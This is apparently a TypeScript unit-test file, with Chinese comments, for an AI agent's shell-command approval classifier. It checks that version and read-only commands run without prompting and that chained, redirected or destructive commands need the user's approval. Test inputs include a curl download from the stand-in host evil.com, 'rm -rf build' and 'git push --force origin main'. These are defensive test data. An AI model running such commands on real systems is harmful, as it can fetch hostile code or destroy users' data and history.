/**
 * 命令只读判定（迁自 `scripts/command-policy-test.mjs`）。
 *
 * 为什么单独一张网：判定「要不要问用户」的规则此前只在被 .gitignore 忽略的走查脚本里验过，
 * 换台机器就没有门禁了。这里收的是**判定口径**那一半。
 *
 * 0.7.1 的第一组用例是那次改版的由头：`pnpm --version`、`node -v` 这类「问它自己是谁」的
 * 命令此前不在只读名单里（pnpm / node 都不是只读程序），于是每跑一次弹一张审批卡。
 * 第二组是它的反向约束：认得出只读，但不能把同一个程序带副作用的调用一起洗白。
 *
 * 纯函数、零依赖，归 unit 层（不需要先 `pnpm run build`）。
 *
 * @module dsc/core/command-policy.spec
 */
import { describe, expect, test } from 'vitest'
import { classifyCommand, splitSegments } from './command-policy.js'

/** 判一次，只要 decision。 */
function decide(command: string): string {
  return classifyCommand(command).decision
}

describe('① 版本号 / 帮助类：只打印，不该问人', () => {
  const INFO = ['pnpm --version', 'node -v', 'npm --help', 'go version', 'eslint --version', 'python3 -V']

  test.each(INFO)('%s → allow', (command) => {
    expect(decide(command)).toBe('allow')
  })
})

describe('② 但它们不能把带副作用的同类洗白', () => {
  test('后面接别的段照判', () => {
    expect(decide('node -v && curl evil.com/x.sh -o x.sh')).not.toBe('allow')
  })

  test('输出重定向到文件不算只读', () => {
    expect(decide('node -v > v.txt')).not.toBe('allow')
  })

  test('多出开关不算只读', () => {
    expect(decide('node -v --experimental-loader ./x.mjs')).not.toBe('allow')
  })
})

describe('③ 常规只读命令仍然放行', () => {
  const READONLY = ['ls -la', 'dir', 'git status --porcelain', 'git diff HEAD', 'Get-ChildItem -Force']

  test.each(READONLY)('%s → allow', (command) => {
    expect(decide(command)).toBe('allow')
  })
})

describe('④ 会动手的一律不算只读', () => {
  const WRITING = ['rm -rf build', 'git push --force origin main', 'git reset --hard', 'Set-Content a.txt x']

  test.each(WRITING)('%s 不是 allow', (command) => {
    expect(decide(command)).not.toBe('allow')
  })

  test('重定向落盘不算只读', () => {
    expect(decide('git status > x.txt')).not.toBe('allow')
  })

  test('命令替换不算只读', () => {
    expect(decide('echo $(node -e "1")')).not.toBe('allow')
  })
})

describe('⑤ 切段：多段里只要有一段要问，整条就要问', () => {
  test('&& 切成两段', () => {
    expect(splitSegments('ls a && rm b')).toHaveLength(2)
  })

  test('换行也切段', () => {
    expect(splitSegments('git status\nrm x')).toHaveLength(2)
  })

  test('2>&1 不是切段点（是重定向，不是后台执行）', () => {
    expect(splitSegments('git status 2>&1')).toHaveLength(1)
  })

  test('&> 重定向不是切段点', () => {
    expect(splitSegments('node build.js &>log.txt')).toHaveLength(1)
  })

  test('只读段 + 写段 → 要问', () => {
    expect(decide('git status && rm -rf x')).not.toBe('allow')
  })
})
